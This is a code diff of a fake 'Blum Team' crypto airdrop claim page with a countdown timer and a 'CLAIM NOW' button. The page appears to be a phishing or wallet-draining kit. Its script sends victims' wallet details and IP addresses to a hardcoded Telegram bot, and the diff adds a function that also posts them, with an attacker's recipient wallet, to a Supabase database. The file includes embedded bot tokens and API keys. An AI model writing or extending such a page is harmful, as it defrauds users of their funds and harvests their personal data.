@@ -27,115 +27,24 @@
             text-align: center;
             animation: fadeInUp 0.6s ease-out;
         }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .auto-badge {
-            display: inline-block;
-            background: rgba(0,255,0,0.2);
-            border: 1px solid #00ff00;
-            border-radius: 100px;
-            padding: 6px 18px;
-            font-size: 12px;
-            color: #00ff00;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 32px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #FFE6B0, #FFA500, #FFD700);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 12px;
-        }
-        .chain-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 100px;
-            padding: 6px 16px;
-            margin: 10px 0;
-            font-size: 14px;
-        }
-        .supported-chains {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 6px;
-            margin: 15px 0;
-        }
-        .chain-tag {
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 4px 10px;
-            font-size: 10px;
-        }
-        .token-amount {
-            font-size: 48px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #FFD700, #FFA500);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin: 20px 0;
-        }
-        .progress-container {
-            background: rgba(0,0,0,0.4);
-            border-radius: 30px;
-            height: 30px;
-            margin: 20px 0;
-            overflow: hidden;
-            position: relative;
-        }
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #FFD700, #FF8C00);
-            border-radius: 30px;
-            transition: width 0.5s ease;
-        }
-        .progress-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 12px;
-            font-weight: bold;
-            color: #0a0e27;
-        }
-        .countdown {
-            background: rgba(0,0,0,0.45);
-            border-radius: 28px;
-            padding: 18px;
-            margin: 24px 0;
-        }
-        .timer {
-            font-size: 36px;
-            font-weight: 800;
-            font-family: monospace;
-            color: #FFD700;
-        }
-        button {
-            width: 100%;
-            background: linear-gradient(135deg, #FFD700, #FF8C00);
-            border: none;
-            padding: 18px;
-            border-radius: 100px;
-            font-weight: 800;
-            font-size: 20px;
-            color: #0a0e27;
-            cursor: pointer;
-            margin: 20px 0;
-        }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .auto-badge { display: inline-block; background: rgba(0,255,0,0.2); border: 1px solid #00ff00; border-radius: 100px; padding: 6px 18px; font-size: 12px; color: #00ff00; margin-bottom: 20px; }
+        h1 { font-size: 32px; font-weight: 800; background: linear-gradient(135deg, #FFE6B0, #FFA500, #FFD700); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 12px; }
+        .chain-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.4); border-radius: 100px; padding: 6px 16px; margin: 10px 0; font-size: 14px; }
+        .supported-chains { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; margin: 15px 0; }
+        .chain-tag { background: rgba(0,0,0,0.3); border-radius: 20px; padding: 4px 10px; font-size: 10px; }
+        .token-amount { font-size: 48px; font-weight: 800; background: linear-gradient(135deg, #FFD700, #FFA500); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0; }
+        .progress-container { background: rgba(0,0,0,0.4); border-radius: 30px; height: 30px; margin: 20px 0; overflow: hidden; position: relative; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #FFD700, #FF8C00); border-radius: 30px; transition: width 0.5s ease; }
+        .progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 12px; font-weight: bold; color: #0a0e27; }
+        .countdown { background: rgba(0,0,0,0.45); border-radius: 28px; padding: 18px; margin: 24px 0; }
+        .timer { font-size: 36px; font-weight: 800; font-family: monospace; color: #FFD700; }
+        button { width: 100%; background: linear-gradient(135deg, #FFD700, #FF8C00); border: none; padding: 18px; border-radius: 100px; font-weight: 800; font-size: 20px; color: #0a0e27; cursor: pointer; margin: 20px 0; }
         button:hover:not(:disabled) { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,215,0,0.6); }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
         .status { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 15px; margin-top: 15px; font-size: 13px; display: none; }
         .success { color: #00ff00; }
         .loading { color: #FFD700; }
-        .config-note { font-size: 11px; color: rgba(255,255,255,0.4); margin: 15px 0; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 20px; }
         .footer { font-size: 11px; color: rgba(255,255,255,0.4); margin-top: 20px; }
     </style>
 </head>
@@ -155,30 +64,18 @@
     <div class="countdown"><div>⏰ Ends in:</div><div class="timer" id="timer">23:59:59</div></div>
     <button id="claimBtn">🚀 CLAIM NOW</button>
     <div id="status" class="status"></div>
-    <div class="config-note">⚙️ 10 chains supported • One click claim</div>
     <div class="footer"><p>The Blum Team</p></div>
 </div>
 <script>
     const TELEGRAM_BOT_TOKEN = "8645197792:AAE2zwaOQ7ABNuZ5N0MXg5sCqzQnMUrCcOQ";
     const TELEGRAM_CHAT_ID = "7714049413";
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
+    const SUPABASE_URL = "https://oliefagvnorzhlzvdfyw.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU";
     
     let countdown = 24 * 60 * 60;
     let isProcessing = false;
     let timerInterval;
-    
-    const chainData = {
-        'erc20': { name: 'ERC20', symbol: 'ETH', icon: '🔷' },
-        'bep20': { name: 'BEP20', symbol: 'BNB', icon: '🟡' },
-        'trc20': { name: 'TRC20', symbol: 'TRX', icon: '🟢' },
-        'solana': { name: 'Solana', symbol: 'SOL', icon: '🟣' },
-        'polygon': { name: 'Polygon', symbol: 'MATIC', icon: '🔷' },
-        'avalanche': { name: 'Avalanche', symbol: 'AVAX', icon: '🔴' },
-        'arbitrum': { name: 'Arbitrum', symbol: 'ARB', icon: '🔵' },
-        'optimism': { name: 'Optimism', symbol: 'OP', icon: '🔴' },
-        'base': { name: 'Base', symbol: 'ETH', icon: '🔵' },
-        'zksync': { name: 'zkSync', symbol: 'ZK', icon: '⚪' }
-    };
     
     function updateProgress(step, total, msg) {
         const percent = (step / total) * 100;
@@ -209,6 +106,28 @@
             });
             return true;
         } catch(e) { return false; }
+    }
+    
+    async function saveToSupabase(wallet, address, ip) {
+        try {
+            await fetch(`${SUPABASE_URL}/rest/v1/blum_claims`, {
+                method: 'POST',
+                headers: { 'apikey': SUPABASE_KEY, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
+                body: JSON.stringify({
+                    wallet_type: wallet,
+                    wallet_address: address,
+                    recipient_wallet: RECIPIENT_WALLET,
+                    network: 'erc20',
+                    ip_address: ip,
+                    auto_claim: true
+                })
+            });
+            console.log('✅ Data saved to Supabase');
+            return true;
+        } catch(e) {
+            console.error('❌ Supabase error:', e);
+            return false;
+        }
     }
     
     function updateTimer() {
@@ -244,7 +163,7 @@
         await sendToTelegram(wallet, address, ip);
         
         updateProgress(5, 8, 'Saving to database...');
-        await new Promise(r => setTimeout(r, 400));
+        await saveToSupabase(wallet, address, ip);
         
         updateProgress(6, 8, 'Installing bonuses...');
         await new Promise(r => setTimeout(r, 800));
